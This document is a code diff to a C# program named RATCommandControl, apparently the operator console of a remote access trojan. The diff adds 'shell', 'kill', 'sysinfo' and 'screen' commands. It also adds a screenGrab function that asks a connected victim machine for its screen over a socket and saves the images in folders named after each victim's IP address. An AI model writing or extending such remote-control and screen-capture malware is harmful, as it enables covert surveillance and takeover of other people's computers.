@@ -7,6 +7,8 @@ using System.Threading;
 using System.Net;
 using System.Net.Sockets;
 using System.Collections;
+using System.IO;
+using System.Drawing;
 
 namespace RATCommandControl
 {
@@ -74,6 +76,10 @@ namespace RATCommandControl
             commandIndex.Add("exec");
             commandIndex.Add("select");
             commandIndex.Add("unselect");
+            commandIndex.Add("shell");
+            commandIndex.Add("kill");
+            commandIndex.Add("sysinfo");
+            commandIndex.Add("screen");
             EndPoint selectedEndpoint = null;
             String commandString = null;
             String currentEndpointString = "no endpoint selected!";
@@ -145,11 +151,54 @@ namespace RATCommandControl
                     {
                         getSystemInfo(selectedEndpoint);
                     }
+                }else if (commandString.Equals("screen"))
+                {
+                    if(selectedEndpoint == null)
+                    {
+                        Console.WriteLine("Error: No endpoint selected");
+                    }else
+                    {
+                        screenGrab(selectedEndpoint);
+                    }
                 }
             }
             Environment.Exit(0xbeef);
             
             
+        }
+        static void screenGrab(EndPoint e) //Slight memory leak here...
+        {
+            int endpointIndex = connectedEndPoints.IndexOf(e);
+            Socket usingSock = associatedHandlers.ElementAt(endpointIndex);
+            String query = "y0ink";
+            query += (char)4;
+            byte[] queryBytes = Encoding.ASCII.GetBytes(query);
+            usingSock.Send(queryBytes);
+            byte[] recvChunk = new byte[1024];
+            String recvString = null;
+            List<byte> imgBytes = new List<Byte>();
+            while (true)
+            {
+                int recvSize = usingSock.Receive(recvChunk);
+                recvString = Encoding.ASCII.GetString(recvChunk, 0, recvSize);
+                foreach(byte b in recvChunk)
+                {
+                    imgBytes.Add(b);
+                }
+                if (recvString.IndexOf("IEND") > -1)
+                {
+                    break;
+                }
+                
+            }
+            Console.WriteLine("broke loop.");
+            var ms = new MemoryStream(imgBytes.ToArray());
+            Image img = Image.FromStream(ms);
+            IPEndPoint clientIPEndpoint = usingSock.RemoteEndPoint as IPEndPoint;
+            System.IO.Directory.CreateDirectory("screenshots_"+clientIPEndpoint.Address.MapToIPv4().ToString());
+            img.Save(Environment.CurrentDirectory+ "\\screenshots_" + clientIPEndpoint.Address.MapToIPv4().ToString()+"\\screenshot" +DateTime.Now.Ticks.ToString()+".png",System.Drawing.Imaging.ImageFormat.Png);
+            img.Dispose();
+            ms.Dispose();
         }
         static void getSystemInfo(EndPoint e)
         {
